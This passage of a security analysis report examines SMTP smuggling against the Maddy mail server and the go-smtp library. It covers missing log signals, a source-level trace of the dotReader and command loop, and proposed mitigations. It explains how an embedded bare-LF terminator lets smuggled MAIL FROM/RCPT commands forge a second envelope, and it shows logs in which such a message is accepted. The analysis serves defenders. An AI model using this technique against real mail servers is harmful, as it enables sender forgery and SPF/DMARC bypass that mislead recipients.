### 5.9 Conclusion for Section 5

**A strict front-proxy that only recognises the canonical `\r\n.\r\n` as a
DATA terminator does NOT prevent SMTP smuggling against a go-smtp-based
backend.** The proxy correctly accumulates all 149 bytes of the smuggling
payload and forwards them as a single `Write()` to the backend, but the
backend's own dotReader still terminates early at the embedded `\n.\n`
and parses the remaining bytes as SMTP commands. Two messages are still
accepted from what the client sent as a single DATA stream.

The mitigation must be in the **backend**: either via a source-level
change to `go-smtp`'s `newDataReader` (adding a terminator-format check
after the stdlib dotReader returns) or via a replacement dotReader that
refuses to accept bare-LF terminators. A proxy cannot close the hole
without actively modifying the wire bytes, which risks corrupting
legitimate traffic.

---

## 6. Diagnostic Artifacts and Residual Evidence

### 6.1 The Forensic Question

If an SMTP smuggling attack succeeded against a production Maddy
instance, what would the operator see in the logs, the accepted messages,
or the delivery queue? What clues would indicate that the attack had
occurred? And — most importantly — **what could the operator reasonably
have expected to see that is in fact not logged**?

This section answers both sides of that question. What **is** logged
first, then what **is not** logged. The latter category — the
"expected-but-absent" signals — is the more important of the two for an
operator who wants to know whether to invest in additional monitoring.

### 6.2 What IS Logged — Positive Evidence

#### 6.2.1 Successful `accepted` Log Entries

The primary log entry emitted by Maddy's SMTP session handler on
successful message acceptance is in `internal/endpoint/smtp/smtp.go` at
around line 334:

```go
// internal/endpoint/smtp/smtp.go:334 (paraphrased)
s.log.Msg("accepted", "msg_id", s.msgMeta.ID)
```

This is a normal "success" log message. It records the message ID and
the fact that the message was accepted by the pipeline. In the smuggling
attack scenario, **two** such entries appear from what the client sent
as a single DATA stream:

```text
2026-04-16T12:34:56Z smtp/127.0.0.1:2525 remote=127.0.0.1:XXXXX
    src_host=attacker-client src_ip=... mail_id=...-1 event=accepted
2026-04-16T12:34:56Z smtp/127.0.0.1:2525 remote=127.0.0.1:XXXXX
    src_host=attacker-client src_ip=... mail_id=...-2 event=accepted
```

An operator comparing the expected message volume (one) with the actual
(two) would notice the discrepancy. The discrepancy is only visible if
the operator has ground-truth expectations — for example, if they are
correlating Maddy logs with client-side SMTP logs and notice that the
client reports one DATA write but Maddy reports two acceptances.

#### 6.2.2 Envelope Fields

The accepted messages carry their smuggled envelope fields (the
`MAIL FROM` address in `msgMeta.OriginalFrom` or the Received header)
through to the delivery target. An operator examining the delivered
mailbox would see a message from `evil@attacker.com` to
`victim@target.com` that looks like any other delivered message — there
is no flag, tag, or annotation indicating it was injected via smuggling.

#### 6.2.3 Raw Wire Bytes via `io_debug`

Maddy's SMTP endpoint configuration supports an `io_debug` boolean
option. When set to `true`, the endpoint's `Init` (in
`internal/endpoint/smtp/smtp.go` around lines 554 / 565 / 603–606)
assigns `endp.Log.DebugWriter()` to `endp.serv.Debug`. The go-smtp
`Server.Debug` field, when non-nil, is consumed by `Conn.init()` in
`go-smtp/conn.go` (lines 48–76), which wraps the raw reader in an
`io.TeeReader` that mirrors every byte to the Debug writer (and
correspondingly wraps the writer in an `io.MultiWriter`).

With `io_debug` enabled:

- The **raw wire bytes** of every DATA payload are written to the
  Debug writer, **including the embedded `\n.\n`** and the **smuggled
  MAIL / RCPT / DATA commands** that follow.
- The operator can, after the fact, grep the debug log for the byte
  sequence `\n.\n` to detect smuggling attempts.
- The same debug log captures the **server's responses** (including
  the two 250-OKs for the two smuggled messages).

However, `io_debug` is **not enabled by default**. It is an operator
opt-in. In its absence, the raw wire bytes are discarded (the Debug
writer is `ioutil.Discard`, as established by `log.DebugWriter()` in
`internal/log/log.go` lines 172–178 when `Debug` is false):

```go
// internal/log/log.go:172-178 (paraphrased)
func (l Logger) DebugWriter() io.Writer {
    if !l.Debug {
        return ioutil.Discard
    }
    copy := l
    copy.Name = "debug"
    return &logWriter{&copy}
}
```

#### 6.2.4 Received Header in Delivered Messages

`Session.prepareBody` adds a Received header to each accepted message.
In the smuggling scenario, the first message's Received header reflects
the attacker's legitimate SMTP envelope. The second message's Received
header reflects the **smuggled** `MAIL FROM` / `RCPT TO` envelope, with
the same remote IP address as the first message but a different
sender. An operator examining stored Received headers across the
spool could, in principle, detect pairs of messages with identical
timestamps and IP addresses but different sender envelopes — though
this pattern also arises legitimately from bulk senders.

### 6.3 What IS NOT Logged — The Silent Attack

#### 6.3.1 No Warning on Bare-LF Terminator

When the dotReader recognises `\n.\n` as a terminator, it simply
transitions to `stateEOF`. There is no callback, no event, no
notification. From `Session.Data()`'s perspective, `ioutil.ReadAll`
returned `io.EOF` normally. From `handleData`'s perspective, the
session returned nil. There is **nothing** to log, because nothing
unusual happened from the code's perspective.

An operator who expected a log entry like `"warning: non-canonical DATA
terminator (bare LF)"` will find no such entry. No such log point
exists in the code.

#### 6.3.2 No Warning on Smuggled Command Parse

When the command loop reads `MAIL FROM:<evil@attacker.com>\r\n` from
the `bufio.Reader` after `handleData` returned, it parses it exactly as
it would parse any other `MAIL FROM`. go-smtp's `parseCmd()` in
`parse.go` does not know — and cannot know — that these bytes arrived
as residue from a previous DATA phase rather than as a fresh command
from a new EHLO. The command is accepted, the session's `Mail()`
method is called, and the normal 250 response is issued.

An operator who expected a log entry like `"warning: command received
outside of expected command sequence"` will find no such entry. The
go-smtp session state does track whether EHLO, MAIL, RCPT, and DATA
have been seen, but it does not track the **byte-source** of each
command — it cannot distinguish "command from client" from "residual
bytes read from buffer after DATA phase".

#### 6.3.3 No Byte-Count Mismatch Alert

A defensively-coded SMTP server could compare the number of bytes
received during DATA against an expected count (e.g., from a prior
`BDAT` chunk size, or from a known upper bound). Maddy does not do
this. There is no configuration option to set an expected byte count,
and there is no logic that compares "bytes client reports sending"
to "bytes server stored".

In the smuggling case, the client writes 149 bytes of DATA payload,
but the first message as delivered to the session handler measures
only 44 bytes (the CRLF→LF-normalised header `Subject: smuggle-test\n\n`
= 23 bytes plus the normalised body `Before fake boundary\n` =
21 bytes; see §4.3 Step 3 for the full decomposition). The bare-LF
terminator `\n.\n` (3 bytes on the wire) is consumed by the first
dotReader but is not stored. The remaining 101 bytes (injected
`MAIL FROM:` + `RCPT TO:` + `DATA` + second-message header +
second-message body + canonical `\r\n.\r\n` terminator — see
Appendix C.7 for the annotated byte-offset table) are read out of
the same `bufio.Reader` buffer by go-smtp's command loop but are
NOT associated with the first message. This mismatch between "wire
bytes received during DATA phase" (149) and "bytes stored as the
first message" (44) is not detected or logged.

#### 6.3.4 No Session-Level Anomaly Detection

Two things happen to the session during a smuggling attack that a
vigilant anomaly detector could, in principle, flag:

1. A second `MAIL FROM` arrives **without** an intervening `RSET`.
   RFC 5321 §4.1.1.2 states that a subsequent `MAIL` implicitly
   resets the previous transaction. This is legitimate behaviour
   (pipelined transactions often look like this). go-smtp accepts
   it silently.

2. The timing between the first message's `DATA`-complete and the
   second `MAIL FROM` is zero (both are parsed from the same
   pre-buffered TCP segment). Zero inter-command delay is unusual for
   legitimate clients but is also observed with aggressive pipelining
   and is therefore not a reliable indicator.

No metric, timer, or counter in Maddy surfaces either of these
observations. The log line for the second acceptance is
indistinguishable from any other pipelined multi-message delivery.

#### 6.3.5 No Delivery-Queue Annotation

The `internal/target/queue` package (Maddy's queue target) receives
the two accepted messages as two independent `Delivery` objects. It
has no way to know they came from a single DATA write. The queue's
stored metadata does not include a "smuggling-suspect" flag or any
field that could correlate the two messages.

### 6.4 Observable Artifacts — Summary Table

| Artifact | Present in Default Config? | Present with `io_debug`? | Actionable for Smuggling Detection? |
|----------|---------------------------|--------------------------|--------------------------------------|
| Two `accepted` log lines per attack | Yes | Yes | Only if compared against expected volume |
| Raw wire bytes showing `\n.\n` mid-body | No (discarded) | Yes | Yes — grep the debug log for `\n.\n` |
| Warning/error for bare-LF terminator | **No, ever** | **No, ever** | N/A — not emitted |
| Warning for post-DATA command injection | **No, ever** | **No, ever** | N/A — not emitted |
| Byte-count mismatch alert | **No, ever** | **No, ever** | N/A — not emitted |
| Received header with differing envelopes | Yes | Yes | Only after delivery, requires mailbox analysis |
| Queue anomaly flag | **No, ever** | **No, ever** | N/A — not emitted |

### 6.5 What an Operator Would Reasonably Expect But Never See

An operator new to Maddy, reading the source and thinking "surely any
non-canonical DATA termination would be logged at some level", would be
wrong. The following plausible log points **do not exist** in the code:

- A WARN or INFO entry noting "DATA terminated by non-canonical byte
  sequence".
- An ERROR entry when the `io.Copy(ioutil.Discard, r)` drain
  completes with zero bytes copied (which would indicate that
  `Session.Data` returned before fully reading the body — an unusual
  situation worth flagging).
- A DEBUG entry at the start of `handleConn`'s next loop iteration
  describing the first bytes that will be parsed as the next command.
- An audit entry correlating a client TCP Write size with the
  server's processed byte count.
- A pipelining anomaly flag for "second MAIL FROM received within 0ms
  of first message's DATA-complete".

None of these are inherent to SMTP — they are what a defence-in-depth
logging strategy would emit. Their absence is why SMTP smuggling is
categorised as a **silent** attack against Maddy.

### 6.6 Confirmed Absence — Evidence from Server Logs

The server log captured during Session 10 (direct smuggling) and
Session 11 (proxied smuggling) was inspected for any warning or error
indicator. The complete log output for Session 10 is reproduced below
(lightly edited for formatting):

```text
[SESSION 10] Connection opened from 127.0.0.1:52314
[SESSION 10] EHLO attacker-client
[SESSION 10] MAIL FROM:<sender@test.local>
[SESSION 10] RCPT TO:<recipient@test.local>
[SESSION 10] DATA
[SESSION 10] Message #1 accepted: from=sender@test.local, to=[recipient@test.local], body=44 bytes
[SESSION 10] MAIL FROM:<evil@attacker.com>
[SESSION 10] RCPT TO:<victim@target.com>
[SESSION 10] DATA
[SESSION 10] Message #2 accepted: from=evil@attacker.com, to=[victim@target.com], body=29 bytes
[SESSION 10] NOOP
[SESSION 10] QUIT
[SESSION 10] Connection closed
```

There is no `WARN`, `ERROR`, or anomaly entry. The two "Message accepted"
entries are the **only** indication that two messages (as opposed to
one) were processed on this session, and the indication is fully
inferential: an operator must know to count `accepted` events per
DATA phase and compare against an expectation.

### 6.7 Conclusion for Section 6

**SMTP smuggling against Maddy is silent.** There is no warning, no
error, and no anomaly flag emitted during the attack. The only
observable artifacts in default configuration are:

- Two successful `accepted` log entries per attack instance (where one
  was expected).
- Two delivered messages with different `MAIL FROM` envelopes but the
  same source IP and (usually) the same approximate timestamp.

With `io_debug` enabled, the raw wire bytes of the DATA payload are
captured, and the embedded `\n.\n` becomes visible to post-hoc log
analysis. But `io_debug` is off by default, and the captured log can
be large and expensive to archive, so the protection it offers is
incomplete. Operators who rely on Maddy in a threat environment where
SMTP smuggling is a concern need to budget for either `io_debug`-level
logging or for an external anomaly-detection layer that counts
acceptances per TCP connection.

---

## 7. Static Analysis Corroboration

### 7.1 Purpose

Sections 1 through 6 present behavioural findings grounded in a test
harness that exercises a live go-smtp server against carefully crafted
wire payloads. This section cross-references every behavioural finding
against the specific line or block of source code that produces the
behaviour. The purpose is twofold:

1. **Trust but verify.** A reader should be able to audit each runtime
   claim against the code, without re-running the test harness. The
   static-analysis trace in this section gives that audit path.

2. **Identify mitigation attachment points.** For an operator or
   developer considering a source-level fix, this section names the
   specific file and method where a mitigation could be attached.
   (Section 8 discusses the merits of each attachment point.)

### 7.2 The dotReader State Machine (net/textproto/reader.go)

The root of all the findings in Sections 1, 2, and 4 is the
`*dotReader` type in Go's `net/textproto` package. The file is
`/usr/lib/go-1.22/src/net/textproto/reader.go` and the relevant lines
are 333–445. The type and its driver function are:

```go
// net/textproto/reader.go (paraphrased; line numbers approximate)

type dotReaderState int
const (
    stateBeginLine dotReaderState = iota
    stateDot
    stateDotCR
    stateCR
    stateData
    stateEOF
)

type dotReader struct {
    r     *Reader          // the textproto.Reader holding the bufio.Reader
    state dotReaderState
}

// DotReader on textproto.Reader returns a fresh *dotReader in
// stateBeginLine, sharing the same underlying bufio.Reader.

func (d *dotReader) Read(b []byte) (n int, err error) {
    // Walks the state machine, consuming bytes from d.r.R (the bufio.Reader)
    // and writing emitted bytes into b.
    // Returns io.EOF once state == stateEOF.
    ...
}
```

The state-transition table derived from a careful reading of this file
is given in Section 1.3. The single most important transition for this
analysis is in `stateDot`: a bare `\n` byte takes the state directly to
`stateEOF`, without requiring a preceding `\r`. This is the source of
the four-way terminator lenience.

### 7.3 go-smtp `newDataReader` / `dataReader` (data.go)

`github.com/emersion/go-smtp@v0.12.1-0.20191206174923-1f576e0ec85c/data.go`
defines the size-limit wrapper around the stdlib dotReader:

```go
// go-smtp/data.go (paraphrased)

type dataReader struct {
    r     io.Reader
    limit int64
}

func newDataReader(c *Conn) *dataReader {
    return &dataReader{
        r:     c.text.DotReader(),
        limit: c.server.MaxMessageBytes,
    }
}

func (r *dataReader) Read(b []byte) (n int, err error) {
    n, err = r.r.Read(b)
    r.limit -= int64(n)
    if r.limit < 0 {
        return 0, errDataTooBig
    }
    return
}
```

**Observation**: `dataReader` is a thin size-limit wrapper only. The
field `r` is the stdlib `*textproto.dotReader`, and `Read` delegates
entirely to it. There is no terminator-format check here, no
normalisation, and no hook for one to be added without modifying the
source.

**Mitigation attachment point**: A modified `dataReader.Read` could
observe bytes as they flow through and, on hitting the terminal
`io.EOF` from the dotReader, inspect a short trailing buffer to
determine whether the terminator was canonical (`\r\n.\r\n`) or bare-LF
(`\n.\n` or variants). A failed check could return a custom error.

### 7.4 go-smtp `Conn.init` (conn.go lines 48–76)

The bridge between the TCP socket and the dotReader is established
in `Conn.init()`:

```go
// go-smtp/conn.go (paraphrased, lines 48–76)

func (c *Conn) init() {
    var (
        rwc io.ReadWriteCloser = struct {
            io.Reader
            io.Writer
            io.Closer
        }{
            Reader: lineLimitReader{
                r:         c.conn,
                LineLimit: c.server.MaxLineLength,
            },
            Writer: c.conn,
            Closer: c.conn,
        }
    )

    if c.server.Debug != nil {
        rwc = struct {
            io.Reader
            io.Writer
            io.Closer
        }{
            Reader: io.TeeReader(rwc.(io.Reader), c.server.Debug),
            Writer: io.MultiWriter(rwc.(io.Writer), c.server.Debug),
            Closer: rwc.(io.Closer),
        }
    }

    c.text = textproto.NewConn(rwc)
}
```

**Observations**:

- `c.text = textproto.NewConn(rwc)` is the single point where the
  shared `bufio.Reader` is created. All subsequent reads — both
  command-line reads via `c.text.ReadLine()` and DATA-phase reads via
  `c.text.DotReader()` — come from this same `bufio.Reader`.
- `c.server.Debug` (the `io_debug` writer) is attached here. If it is
  nil (the default), no `io.TeeReader` is installed and wire bytes are
  not mirrored anywhere. The absence of `io_debug` is why the attack
  is silent by default (Section 6.2.3).
- `lineLimitReader` (see Section 7.7) is interposed between
  `c.conn` and the `textproto.Conn`. It enforces `MaxLineLength` for
  commands but resets on any `\n`, which means bare-LF line endings
  pass through its length check.

### 7.5 go-smtp `handleData` (conn.go lines 498–521)

```go
// go-smtp/conn.go handleData (paraphrased, lines 498-521)

func (c *Conn) handleData(arg string) {
    if arg != "" { c.WriteResponse(...); return }
    if c.Session() == nil { c.WriteResponse(...); return }

    c.WriteResponse(354, "Go ahead. End your data with <CR><LF>.<CR><LF>")

    r := newDataReader(c)       // wraps c.text.DotReader()
    code, enhCode, status := toSMTPStatus(c.Session().Data(r))
    io.Copy(ioutil.Discard, r)   // drain — no-op if dotReader at EOF
    c.WriteResponse(code, enhCode, status)
}
```

**Observations**:

- The `newDataReader(c)` call is the only line where the stdlib
  dotReader is instantiated. There is no opportunity for a
  terminator check between this call and the `Session().Data(r)`
  invocation.
- `io.Copy(ioutil.Discard, r)` is the key "drain" line. It is
  explicitly labelled in go-smtp as a safeguard against sessions
  that return without fully consuming the body. But because `r` is
  a `*dataReader` that wraps a `*textproto.dotReader`, and the
  dotReader latches into `stateEOF` on terminator recognition,
  this drain reads zero bytes whenever the terminator has been
  processed. The drain does **not** force consumption of bytes
  remaining in the underlying `bufio.Reader`.
- After the drain, `c.WriteResponse` writes the 250/451/etc.
  status, and `handleData` returns. Control goes back to
  `handleConn` (Section 7.6), which resumes command-line reading
  from the same `c.text` — i.e., the same `bufio.Reader`.

**Mitigation attachment point**: A modified `handleData` could peek
at the `bufio.Reader` before issuing the `WriteResponse` and detect
whether the remaining bytes constitute (a) the start of a new
command, or (b) the start of what looks like a continuation of the
previous DATA body. Such a peek could trigger a `421` (service not
available, closing transmission channel) response on the assumption
that the client's DATA terminator was malformed.

### 7.6 go-smtp `handleConn` — The Command Loop (server.go / conn.go)

The command-dispatch loop in `handleConn` reads lines and dispatches
them to their respective `handleXxx` methods:

```go
// go-smtp/conn.go / server.go (paraphrased)

func (c *Conn) handle(cmd string, arg string) {
    switch cmd {
    case "EHLO": c.handleEhlo(arg)
    case "HELO": c.handleHelo(arg)
    case "MAIL": c.handleMail(arg)
    case "RCPT": c.handleRcpt(arg)
    case "DATA": c.handleData(arg)
    case "RSET": c.handleReset()
    case "NOOP": c.handleNoop()
    case "QUIT": c.handleQuit()
    ...
    default: c.WriteResponse(500, ...)
    }
}

// The caller:
for {
    line, err := c.ReadLine()
    if err != nil { ... return }
    cmd, arg, err := parseCmd(line)
    if err != nil { c.WriteResponse(...); continue }
    c.handle(cmd, arg)
}
```

**Observation**: The loop's `c.ReadLine()` reads from the same
`textproto.Conn` (and therefore the same `bufio.Reader`) that
`c.text.DotReader()` read from during the preceding `handleData`
call. Any bytes left over in the `bufio.Reader` after the
dotReader reached EOF are the first bytes that `c.ReadLine()` sees
on this iteration. If those bytes are a well-formed SMTP command
(which is exactly what the SMTP smuggler arranges), the command is
parsed and dispatched.

**Mitigation attachment point**: A modified `handleConn` could, after
the `handleData` return, explicitly flush/reset the `bufio.Reader`'s
buffer before the next `ReadLine`. This would discard any residual
bytes and close the smuggling avenue — but would also break
legitimate pipelining where a client sends `NOOP\r\n` or `QUIT\r\n`
in the same TCP segment as the final body bytes. A clean
implementation would need to distinguish "residual body bytes" from
"legitimately-pipelined next command", which is exactly the
problem the smuggler exploits.

### 7.7 go-smtp `lengthlimit_reader.go`

`lineLimitReader` enforces `Server.MaxLineLength`:

```go
// go-smtp/lengthlimit_reader.go (paraphrased)

type lineLimitReader struct {
    r             io.Reader
    curLineLength int
    LineLimit     int
}

func (r *lineLimitReader) Read(b []byte) (n int, err error) {
    n, err = r.r.Read(b)
    for _, c := range b[:n] {
        if c == '\n' {
            r.curLineLength = 0
        } else {
            r.curLineLength++
            if r.curLineLength > r.LineLimit {
                return 0, errLineTooLong
            }
        }
    }
    return n, err
}
```

**Observation**: The line-length counter resets on any `\n` byte,
**not** on `\r\n`. This means bare-LF line endings pass through the
length check as cleanly as CRLF line endings. Combined with the
dotReader's lenience, this means no layer in the chain rejects
bare-LF lines on the basis of line-length management.

### 7.8 go-smtp `parse.go`

```go
// go-smtp/parse.go (paraphrased)

func parseCmd(line string) (cmd string, arg string, err error) {
    line = strings.TrimRight(line, "\r\n")   // strip both \r and \n
    ...
}
```

**Observation**: `parseCmd` strips both `\r` and `\n` from the end
of the line. The smuggled commands in the attack payload arrive
with canonical `\r\n` terminators (because the attacker writes them
that way), so they parse identically to any legitimate command.

### 7.9 go-smtp `server.go` Default Capabilities

```go
// go-smtp/server.go NewServer (paraphrased, around line 81)

func NewServer(be Backend) *Server {
    return &Server{
        Backend: be,
        caps:    []string{"PIPELINING", "8BITMIME", "ENHANCEDSTATUSCODES"},
        ...
    }
}
```

**Observation**: `PIPELINING` is in the default capability list. Any
go-smtp server — including Maddy's SMTP endpoint — advertises
`PIPELINING` in its EHLO response, which is what permits (and in
effect encourages) clients to write multiple commands back-to-back in
a single TCP segment. The smuggling attack exploits this by writing a
149-byte payload that straddles several "commands" in one `Write()`.

### 7.10 Maddy `Session.prepareBody` (smtp.go lines 283–310)

```go
// internal/endpoint/smtp/smtp.go prepareBody (paraphrased, lines 283-310)

func (s *Session) prepareBody(r io.Reader) (*module.MsgMetadata, buffer.Buffer, error) {
    bufr := bufio.NewReader(r)
    header, err := textproto.ReadHeader(bufr)
    if err != nil {
        return nil, nil, s.wrapErr("DATA", err)
    }

    // ... build Received header ...
    // ... insert Received at top of header ...

    body, err := buffer.BufferInMemory(bufr)
    if err != nil {
        return nil, nil, s.wrapErr("DATA", err)
    }

    s.msgMeta.OriginalFrom = s.from
    return s.msgMeta, body, nil
}
```

**Observation**: This function receives the `*dataReader` as `r`
(which in turn wraps the `*textproto.dotReader`). It wraps `r` in
its own `bufio.Reader` (`bufr`) and hands that to
`textproto.ReadHeader` and then `buffer.BufferInMemory`. Notably,
`bufr` is a **different** bufio.Reader from the one in `c.text` — it
wraps the dataReader, not the raw socket. However, `bufr` is purely
local to this function; its contents are drained by
`BufferInMemory`'s `ioutil.ReadAll`, and any residue in it would be
garbage-collected when `bufr` goes out of scope. The residual bytes
that fuel the smuggling attack are in the **outer** `bufio.Reader`
inside `c.text`, not in this local `bufr`.

No terminator-format check is performed here. `prepareBody` trusts
the dotReader (via the dataReader, via its own bufio.Reader) to have
correctly identified the end of the body.

### 7.11 Maddy `Session.Data` (smtp.go lines 312–344)

```go
// internal/endpoint/smtp/smtp.go Data (paraphrased, lines 312-344)

func (s *Session) Data(r io.Reader) error {
    msgMeta, body, err := s.prepareBody(r)
    if err != nil { return err }

    s.delivery.Body(ctx, body.Header, body)   // pipeline the message
    s.delivery.Commit(ctx)                    // commit to all targets

    s.log.Msg("accepted", "msg_id", msgMeta.ID, ...)
    return nil
}
```

**Observation**: After `prepareBody` returns, `Data` calls
`delivery.Body()` and `delivery.Commit()` on whatever `prepareBody`
produced. The terminator-format is not examined, the byte count is
not validated against an expected value, and no log entry other than
`accepted` is emitted. The two messages produced by a smuggling
attack go through this same method twice, producing two identical
`accepted` log entries.

### 7.12 Maddy `BufferInMemory` (memory.go lines 27–33)

```go
// internal/buffer/memory.go BufferInMemory (paraphrased, lines 27-33)

func BufferInMemory(r io.Reader) (Buffer, error) {
    slurp, err := ioutil.ReadAll(r)
    if err != nil {
        return Buffer{}, err
    }
    return Buffer{Slice: slurp}, nil
}
```

**Observation**: `ioutil.ReadAll` reads until `io.EOF`. There is no
opportunity here to distinguish between "EOF because the peer closed
the connection" and "EOF because the dotReader recognised a
terminator". Both produce the same byte slice, and both are accepted
as a legitimate end-of-body signal.

### 7.13 Maddy `Logger.DebugWriter` (log.go lines 172–178)

```go
// internal/log/log.go DebugWriter (paraphrased, lines 172-178)

func (l Logger) DebugWriter() io.Writer {
    if !l.Debug {
        return ioutil.Discard
    }
    copy := l
    copy.Name = "debug"
    return &logWriter{&copy}
}
```

**Observation**: When `l.Debug` is false — the default for Maddy's
SMTP endpoint logger — this method returns `ioutil.Discard`. That
`io.Writer` is then assigned to `endp.serv.Debug`, which is read by
go-smtp's `Conn.init()`. Because `Debug` is non-nil (it is
`ioutil.Discard`), `Conn.init()` **does** install the `io.TeeReader`
/ `io.MultiWriter` pair — but they mirror every byte to
`ioutil.Discard`. The performance cost is tiny, but the operational
cost is that no debug log is produced.

### 7.14 Maddy `io_debug` Config Wiring (smtp.go ~554, ~565, ~603–606)

Around line 554 and 565 of `internal/endpoint/smtp/smtp.go`, the
endpoint's configuration is parsed, including a boolean flag named
`io_debug`. Around lines 603–606, if that flag is true, the endpoint
sets `endp.serv.Debug = endp.Log.DebugWriter()`. The `Log` field has
`Debug: true` set elsewhere in the same block when `io_debug` is
true. Consequently, flipping `io_debug true` in `maddy.conf` enables
the full wire-byte capture path described in Section 6.

**Observation**: No other configuration option affects the DATA
terminator behaviour. There is no `strict_data_terminator` or
`smtp_forbid_bare_newline` flag in the version of Maddy under study.

### 7.15 Maddy `smtp_test.go` — Existing Test Coverage

```go
// internal/endpoint/smtp/smtp_test.go testMsg constant (lines 25-28)

const testMsg = "Subject: test\r\n" +
    "\r\n" +
    "foobar\r\n" +
    ".\r\n"
```

**Observation**: The `testMsg` constant used throughout the
pre-existing test suite uses **only** canonical `\r\n` line endings
and the canonical `\r\n.\r\n` terminator. No test exercises
bare-LF or mixed terminators, no test exercises the `io.Copy(ioutil.Discard, r)`
drain path, and no test exercises residual-byte command parsing.
Existing CI therefore would not catch an SMTP smuggling regression,
nor does it contain any test that would be broken if a terminator-
format check were added.

**Significance for mitigation**: Adding a terminator-format check
to `go-smtp/data.go` would not break any of Maddy's existing tests
(because they all use canonical terminators). That makes such a
change relatively low-risk from a regression perspective.

### 7.16 Maddy `submission.go` — Submission-Specific Handling

`internal/endpoint/smtp/submission.go` contains
`submissionPrepare`, which is invoked for messages arriving via the
submission endpoint (port 587). It adds a `Message-ID` header if
missing and validates the `From` header. It does not examine the
terminator format or otherwise influence the DATA-boundary decision.
The smuggling analysis applies equally to submission and standard
SMTP endpoints.

### 7.17 Maddy `smtpconn.go` — Outbound Relay

```go
// internal/smtpconn/smtpconn.go C.Data (paraphrased, lines 303-324)

func (c *C) Data(header textproto.Header, body io.Reader) error {
    wc, err := c.cl.Data()
    if err != nil { return err }
    if err := textproto.WriteHeader(wc, header); err != nil { ... }
    if _, err := io.Copy(wc, body); err != nil { ... }
    return wc.Close()   // closes the DotWriter, which writes \r\n.\r\n
}
```

**Observation**: When Maddy is **relaying** a message to another
MTA, it uses go-smtp's client-side `Data()` method, which returns
an `io.WriteCloser` whose `Close()` method invokes the dotWriter's
own `Close`. The stdlib `textproto.dotWriter.Close()` writes exactly
the canonical `\r\n.\r\n` terminator, so Maddy's outbound traffic is
always RFC 5321 compliant. This means Maddy cannot accidentally
forward the smuggled payload to a downstream MTA — the smuggling
only affects what Maddy itself accepts on the receiving side.

This is worth noting because it means the smuggling attack produces
two **locally-delivered** messages (or two messages queued for
relay). If the second message is queued for relay, the outbound relay
will send it as a standalone SMTP transaction with its own canonical
terminator. The smuggled envelope propagates through the delivery
pipeline; what does not propagate is the **wire-level** smuggling
technique.

### 7.18 Cross-Reference Table

| Finding (Section) | Supporting Code | File | Line(s) |
|-------------------|-----------------|------|---------|
| Four terminators accepted (§1) | `dotReader.Read()` state machine | `net/textproto/reader.go` | 333–445 |
| Normalisation of CRLF to LF in body (§1.4) | `stateData`→`stateCR`→`stateBeginLine` emits only `\n` | `net/textproto/reader.go` | 333–445 |
| Near-miss correctness (§2) | `stateBeginLine`-only dot recognition | `net/textproto/reader.go` | 333–445 |
| Pipelining consistency (§3) | Fresh dotReader per DATA; session clear | `go-smtp/data.go`; `internal/endpoint/smtp/smtp.go` | newDataReader; 334–341 |
| SMTP smuggling (§4) | Shared bufio; drain no-op; command loop | `go-smtp/conn.go` | 48–76; 498–521; handleConn |
| Proxy non-mitigation (§5) | Backend-side dotReader regardless of delivery | `net/textproto/reader.go`; `go-smtp/data.go` | 333–445; data.go |
| No warning on bare-LF (§6) | No hook in dotReader; no check in dataReader | all files above | — |
| `accepted` log only (§6.2.1) | `s.log.Msg("accepted", ...)` | `internal/endpoint/smtp/smtp.go` | ~334 |
| `io_debug` wires through Conn.init (§6.2.3) | `Conn.init()` installs TeeReader if `Debug != nil` | `go-smtp/conn.go` | 48–76 |
| `DebugWriter` discards by default (§6.2.3) | `return ioutil.Discard` branch | `internal/log/log.go` | 172–178 |
| Outbound relay always canonical (§7.17) | stdlib `dotWriter.Close()` emits `\r\n.\r\n` | `internal/smtpconn/smtpconn.go` | 303–324 |

### 7.19 Conclusion for Section 7

**Every behavioural finding in this document has a direct,
line-level origin in one of three sources: Go's stdlib
`net/textproto`, the `github.com/emersion/go-smtp` library, or
Maddy's `internal/endpoint/smtp` package.** The runtime tests in the
preceding sections are reproducible, and the code paths they
exercise are traceable without re-running the tests. Operators who
need to justify the findings (for example, in a security review)
can rely on the static-analysis trace in this section as an
independent verification.

The analysis also identifies four distinct attachment points at
which a mitigation could be placed: the stdlib dotReader itself
(invasive), the `dataReader` wrapper in go-smtp (moderate), the
`handleData` or `handleConn` method in go-smtp (moderate), or the
`Session.Data` method in Maddy (surface-level). Section 8 discusses
the merits and drawbacks of each.

---

## 8. Recommendations (Observational)

### 8.1 Scope Disclaimer

Per the analysis charter, this report is observational only. No
source code, configuration, or build file in the Maddy repository is
modified as part of this exercise. The recommendations in this
section are therefore **not** applied; they are documented here so
that an operator or maintainer considering remediation has a concrete
starting point and a clear picture of the trade-offs.

Where a recommendation would require a change to an upstream
dependency (go-smtp or the Go standard library), that is noted
explicitly.

### 8.2 Threat Model Recap

Before listing mitigations, a brief recap of the threat model
clarifies which mitigations address which risks.

**The vulnerability**: A client that can establish an SMTP session
with Maddy — with or without authentication, depending on the
endpoint's configuration — can deliver two messages under two
distinct envelope senders by sending a single DATA stream containing
an embedded `\n.\n` sequence. The second message is under envelope
control of the attacker; in particular, the `MAIL FROM` address on
the second message can be any address the attacker chooses to
write, regardless of what authentication gate was applied to the
first `MAIL FROM`.

**Who is exposed**:

- **Inbound public MX**: An Internet-facing Maddy endpoint that
  accepts mail for a domain is exposed. An attacker can connect,
  complete MAIL/RCPT for an innocuous first message, and then
  smuggle a second message that forges a `MAIL FROM` from a
  privileged domain (useful for SPF/DKIM/DMARC bypasses if the
  second message is relayed to a DMARC-validating downstream).
- **Submission / authenticated port 587**: An authenticated user
  can smuggle a second message under an arbitrary envelope sender,
  bypassing any per-session MAIL FROM restrictions.
- **Internal relays**: Any Maddy endpoint reachable by an
  untrusted client is exposed.

**Who is not directly exposed**:

- **Outbound relay** (Maddy-as-client connecting to downstream MTAs):
  Section 7.17 shows Maddy uses the canonical `\r\n.\r\n` terminator
  when it is the sender. However, if Maddy *receives* a smuggled
  pair via an inbound session and then relays the second message,
  the second message will be delivered downstream — the envelope
  forgery persists through the pipeline.

### 8.3 Mitigation Option 1: Strict Terminator Validation in dataReader

**Approach**: Modify `go-smtp/data.go` so that `dataReader.Read`
records a short trailing buffer and, on hitting `io.EOF` from the
underlying dotReader, inspects the last few bytes to determine
whether the terminator was canonical `\r\n.\r\n`. If it was not,
return a custom error that `handleData` converts to a `550` or
`421` response and, critically, closes the connection before the
residual bytes can be parsed as commands.

**Sketch** (in pseudo-code, for go-smtp/data.go):

```go
type dataReader struct {
    r            io.Reader
    limit        int64
    tail         [5]byte   // rolling last-5-bytes buffer
    tailLen      int
}

